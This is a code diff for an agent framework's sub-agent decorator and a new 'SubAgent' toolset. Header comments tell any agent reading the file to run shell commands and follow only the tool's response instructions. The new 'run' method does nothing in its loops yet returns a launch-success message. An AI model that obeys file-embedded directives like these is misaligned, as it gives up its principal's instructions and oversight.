@@ -1,14 +1,15 @@
-"""Sub-agent decorator - marks a tool as a non-blocking background sub-agent launch.
+# @toolset-manifest python -m tools manifest sub_agent.sub_agent:SubAgent
 # @toolset-manifest python -m tools manifest context_tools.bdd.bdd:Bdd
 # Agent reading this file: run line 1 manifest, then python -m tools run -. Follow response.instructions only.
 # invoke-edit: action satisfy | toolset: context_tools.bdd.bdd:Bdd
 # invoke-check: action validate | toolset: context_tools.bdd.bdd:Bdd
+"""Sub-agent decorator - marks a tool as a non-blocking background sub-agent launch.
 
 Usage::
 
     @sub_agent
-    @agent_tool
-    def diagnose(self) -> str:
+    @agent_instructions
+    def run(self, tools: list, actions: list | None = None) -> str:
         \"\"\"Full instructions for the sub-agent go here - inline in the docstring.\"\"\"
 
 When the agent reads the manifest it will see ``kind: sub_agent`` with
@@ -21,6 +22,8 @@ import inspect
 from dataclasses import dataclass
 from typing import Any, Callable
 
+from harness.harness_tool import prompt
+from primitives.actions.action import agent_instructions, agentic_toolset
 from tools.tool import _SignatureReader
 
 
@@ -63,16 +66,16 @@ class SubAgentTool:
 def sub_agent(func: Callable[..., Any]) -> Callable[..., Any]:
     """Mark a method as a non-blocking sub-agent launch.
 
-    Stack on top of ``@agent_tool``::
+    Stack on top of ``@agent_tool`` or ``@agent_instructions``::
 
         @sub_agent
-        @agent_tool
-        def my_task(self) -> str:
+        @agent_instructions
+        def run(self, tools: list, actions: list | None = None) -> str:
             \"\"\"Instructions sent verbatim to the sub-agent.\"\"\"
 
-    ``@agent_tool`` runs first and sets ``_is_agent_tool = True``.  ``@sub_agent`` then
-    sets ``_is_sub_agent = True`` and suppresses ``_is_agent_tool`` so standard tool
-    discovery skips it and ``discover_sub_agent_tools`` picks it up instead.
+    The inner decorator runs first.  ``@sub_agent`` then sets ``_is_sub_agent = True``
+    and suppresses ``_is_agent_tool`` so standard tool discovery skips it and
+    ``discover_sub_agent_tools`` picks it up instead.
     """
     func._is_sub_agent = True  # type: ignore[attr-defined]
     func._is_agent_tool = False  # type: ignore[attr-defined]
@@ -86,3 +89,35 @@ def discover_sub_agent_tools(instance: Any) -> dict[str, SubAgentTool]:
         if getattr(member, "_is_sub_agent", False):
             discovered[name] = SubAgentTool(name=name, callable=getattr(instance, name))
     return discovered
+
+
+@agentic_toolset
+class SubAgent:
+    """Slash ``/sub-agent`` runs this prompt, listed context tools, and listed actions as one non-blocking sub-agent.
+
+    Listed actions (and context tools) open the work session and turn. This kit does not.
+    ``context_tools`` is on AgenticToolset (via ``@agentic_toolset``) — same loader iterate/repair use for ``arguments.tools``.
+    """
+
+    @prompt(name="sub-agent")
+    @sub_agent
+    @agent_instructions
+    def run(self, tools: list, actions: list | None = None) -> str:
+        """Run this prompt, the listed context tools, and any listed actions as one non-blocking sub-agent.
+
+        tools — context tools (same arguments.tools as iterate / repair / generate).
+        actions — optional other action kits (iterate, generate, grill, …) to run with those context tools.
+
+        The parent sees kind: sub_agent / launch: non_blocking and does not wait.
+        Inside this sub-agent: follow this prompt; run each listed action with the
+        listed context tools; if no actions were listed, run each context tool as
+        its own tools run. Do not inline any of that on the parent.
+        Do not open a work session here — the listed action or context tool does that.
+        """
+        """Bring in every listed context tool (AgenticToolset.context_tools)."""
+        for host in self.context_tools(tools):
+            host
+        """Run every listed action kit with those context tools. If actions is empty, run each context tool as a separate tools run."""
+        for kit in self.context_tools(actions or []):
+            kit
+        return "Sub-agent launched with listed context tools and actions."
